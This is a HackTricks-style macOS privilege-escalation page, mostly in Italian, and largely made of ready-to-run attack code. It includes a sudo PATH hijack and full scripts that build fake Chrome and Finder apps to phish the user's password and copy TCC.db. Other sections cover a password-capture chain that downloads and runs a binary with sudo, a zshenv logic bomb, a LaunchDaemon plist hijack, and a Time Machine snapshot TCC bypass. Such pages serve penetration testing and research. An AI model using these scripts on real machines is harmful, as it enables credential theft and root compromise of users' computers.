# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se sei arrivato qui cercando TCC privilege escalation vai a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Si noti che **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. Quindi vedi:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interazione con l'utente

### Sudo Hijacking

Puoi trovare l'originale [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Tuttavia, macOS **mantiene** il **`PATH`** dell'utente quando esegue **`sudo`**. Ciò significa che un altro modo per ottenere questo attacco sarebbe quello di **hijack other binaries** che la vittima eseguirà quando **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Nota che un utente che usa il terminale probabilmente avrà **Homebrew installato**. Quindi è possibile hijackare i binari in **`/opt/homebrew/bin`**.

### Dock Impersonation

Usando un po' di **social engineering** potresti **impersonare per esempio Google Chrome** nel Dock ed effettivamente eseguire il tuo script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Alcuni suggerimenti:

- Verifica nel Dock se è presente Chrome, e in tal caso **rimuovi** quella voce e **aggiungi** la **falsa** **voce di Chrome nella stessa posizione** nell'array del Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Alcuni suggerimenti:

- Non puoi **rimuovere Finder dal Dock**, quindi se intendi aggiungerlo al Dock, puoi posizionare il Finder falso subito accanto a quello reale. Per farlo devi **aggiungere la voce del Finder falso all'inizio dell'array del Dock**.
- Un'altra opzione è di non posizionarlo nel Dock e semplicemente aprirlo; "Finder asking to control Finder" non è così strano.
- Un'altra opzione per **escalate to root without asking** the password con una finestra orribile, è far sì che Finder chieda realmente la password per eseguire un'azione privilegiata:
- Chiedi a Finder di copiare in **`/etc/pam.d`** un nuovo file **`sudo`** (Il prompt che richiede la password indicherà "Finder wants to copy sudo")
- Chiedi a Finder di copiare un nuovo **Authorization Plugin** (Puoi controllare il nome del file in modo che il prompt che richiede la password indichi "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware spesso abusa dell'interazione con l'utente per **catturare una password con privilegi sudo** e riutilizzarla programmaticamente. Un flusso tipico:

1. Identificare l'utente connesso con `whoami`.
2. **Ripetere i prompt di password** finché `dscl . -authonly "$user" "$pw"` non restituisce successo.
3. Mettere in cache la credenziale (es. `/tmp/.pass`) ed eseguire azioni privilegiate con `sudo -S` (password via stdin).

Esempio di catena minima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La password rubata può poi essere riutilizzata per cancellare la quarantena di Gatekeeper con `xattr -c`, copiare LaunchDaemons o altri file privilegiati e avviare ulteriori fasi in modo non interattivo.

## Nuovi vettori specifici per macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` deprecato ma ancora utilizzabile

`AuthorizationExecuteWithPrivileges` è stato deprecato in 10.7 ma **funziona ancora su Sonoma/Sequoia**. Molti updater commerciali invocano `/usr/libexec/security_authtrampoline` con un percorso non affidabile. Se il binario di destinazione è scrivibile dall'utente puoi piantare un trojan e sfruttare il prompt legittimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combina con le **masquerading tricks above** per presentare un dialogo di password credibile.

### Helper privilegiato / triage XPC

Molti macOS privescs di terze parti moderni seguono lo stesso schema: un **root LaunchDaemon** espone un **Mach/XPC service** da **`/Library/PrivilegedHelperTools`**, poi l'helper o **doesn't validate the client**, lo valida **too late** (PID race), oppure espone un **root method** che consuma un **user-controlled path/script**. Questa è la classe di bug dietro molti recenti helper bugs in VPN clients, game launchers and updaters.

Checklist rapida per il triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Fai particolare attenzione ai helper che:

- continuano ad accettare richieste **dopo la disinstallazione** perché il job è rimasto caricato in `launchd`
- eseguono script o leggono configurazioni da **`/Applications/...`** o altri percorsi scrivibili da utenti non-root
- si basano su validazione peer **PID-based** o **bundle-id-only** che può essere soggetta a race

Per maggiori dettagli sui bug di autorizzazione dei helper controlla [questa pagina](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Ereditarietà dell'ambiente degli script di PackageKit (CVE-2024-27822)

Fino a quando Apple non l'ha corretta in **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, le installazioni avviate dall'utente tramite **`Installer.app`** / **`PackageKit.framework`** potevano eseguire **PKG scripts as root inside the current user's environment**. Questo significa che un pacchetto che usa **`#!/bin/zsh`** avrebbe caricato il **`~/.zshenv`** dell'attaccante ed eseguito quel file come **root** quando la vittima installava il pacchetto.

Questo è particolarmente interessante come una **logic bomb**: ti basta un punto d'appoggio nell'account dell'utente e un file di avvio della shell scrivibile, poi aspetti che qualsiasi installer vulnerabile **zsh-based** venga eseguito dall'utente. Questo **non** si applica generalmente alle distribuzioni **MDM/Munki** perché quelle vengono eseguite nell'ambiente dell'utente **root**.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se vuoi un approfondimento più dettagliato sull'abuso specifico degli installer, consulta anche [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Se un LaunchDaemon plist o il suo `ProgramArguments` target è **user-writable**, puoi escalate sostituendolo e forzando launchd a ricaricare:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Questo rispecchia il pattern di exploit pubblicato per **CVE-2025-24085**, dove un plist scrivibile è stato abusato per eseguire codice dell'attaccante come root.

### XNU SMR credential race (CVE-2025-24118)

Una **race in `kauth_cred_proc_update`** permette a un attaccante locale di corrompere il puntatore delle credenziali in sola lettura (`proc_ro.p_ucred`) competendo tra loop `setgid()`/`getgid()` su più thread fino a quando non si verifica un torn `memcpy`. La corruzione riuscita porta a **uid 0** e accesso alla memoria del kernel. Struttura minima del PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Accoppiato con heap grooming per posizionare dati controllati dove il puntatore viene riletto. Su build vulnerabili questo è un affidabile **local kernel privesc** senza requisiti di SIP bypass.

### SIP bypass tramite Migration assistant ("Migraine", CVE-2023-32369)

Se hai già root, SIP blocca comunque le scritture nelle posizioni di sistema. Il bug **Migraine** sfrutta l'entitlement di Migration Assistant `com.apple.rootless.install.heritable` per generare un processo figlio che eredita il bypass SIP e sovrascrive percorsi protetti (es., `/System/Library/LaunchDaemons`). La catena:

1. Ottenere root su un sistema in esecuzione.
2. Scatenare `systemmigrationd` con uno stato appositamente creato per eseguire un binario controllato dall'attaccante.
3. Usare l'entitlement ereditato per patchare file protetti da SIP, persistendo anche dopo il riavvio.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Molti daemon Apple accettano oggetti **NSPredicate** tramite XPC e validano solo il campo `expressionType`, controllabile dall'attaccante. Creando un predicate che valuta selector arbitrari puoi ottenere **code execution in root/system XPC services** (es., `coreduetd`, `contextstored`). Se combinato con una iniziale app sandbox escape, questo concede **privilege escalation without user prompts**. Cerca endpoint XPC che deserializzano predicate e che non hanno un visitor robusto.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualsiasi utente** (anche non privilegiati) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
Il **l'unico privilegio** necessario è che l'applicazione usata (per es., `Terminal`) abbia **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concessa da un admin.

<details>
<summary>Montare uno snapshot di Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Una spiegazione più dettagliata può essere [**trovata nel rapporto originale**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Informazioni sensibili

Questo può essere utile per ottenere l'elevazione dei privilegi:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Riferimenti

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
